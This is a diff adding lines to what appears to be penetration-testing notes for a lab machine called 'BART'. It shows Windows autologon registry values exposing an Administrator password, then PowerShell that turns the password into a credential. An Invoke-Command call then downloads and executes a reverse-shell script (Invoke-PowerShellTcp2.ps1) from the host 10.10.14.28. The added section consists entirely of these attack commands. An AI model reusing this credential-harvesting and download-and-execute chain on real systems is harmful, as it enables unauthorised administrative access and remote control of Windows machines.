@@ -21,6 +21,19 @@ true
 true
 Get-ItemProperty .
 
+W
+
+DefaultUserName               :  Administrator
+DefaultPassword               :  3130438f31186fbaf962f407711faddb
+
+$username = "BART\Administrator"                                            
+$password = "3130438f31186fbaf962f407711faddb"                              
+$secstr = New-Object -TypeName System.Security.SecureString                 
+$password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr
+$cred = new-object - typename System.Management.Automation.PSCredential -argument $username, $secstr
+Invoke-Command -ScriptBlock {IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');} -Credential $cred -Computer localhost
+
 ==============================================================================
 [+] Transfer files
 ==============================================================================
